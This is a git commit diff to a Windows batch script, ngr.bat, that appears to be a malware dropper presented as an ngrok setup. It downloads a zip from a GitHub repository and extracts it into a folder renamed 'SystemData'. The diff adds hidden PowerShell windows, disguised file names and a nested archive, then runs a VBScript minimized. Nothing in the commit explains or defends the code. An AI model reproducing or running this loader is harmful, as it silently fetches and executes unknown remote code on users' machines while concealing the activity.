b4ee1ccdd4dcfa0fa078bc9556a5303529e7cd13
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-13 16:01:03 +0300

    a

--- ngr.bat
+++ ngr.bat
@@ -2,18 +2,23 @@
 setlocal
 
 set "repo_url=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
-set "download_path=%USERPROFILE%\Downloads\repo.zip"
-set "extract_to=%LOCALAPPDATA%\ngrok"
+set "download_path=%TEMP%\setupdata.zip"
+set "extract_to=%LOCALAPPDATA%\SystemData"
 set "temp_folder=%extract_to%\mamf-main"
+set "zip_file=%extract_to%\data.zip"
 
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%repo_url%', '%download_path%')"
-
-powershell -Command "Expand-Archive -LiteralPath '%download_path%' -DestinationPath '%extract_to%'"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%repo_url%', '%download_path%')"
+powershell -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%download_path%' -DestinationPath '%extract_to%'"
 
 del /f /q "%download_path%"
 
 xcopy "%temp_folder%\*" "%extract_to%\" /E /H /Y
 rmdir /s /q "%temp_folder%"
+
+if exist "%zip_file%" (
+    powershell -WindowStyle Hidden -Command "Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('%zip_file%', '%extract_to%')"
+    del /f /q "%zip_file%"
+)
 
 start "" /min cscript //nologo "%extract_to%\s.vbs"
 
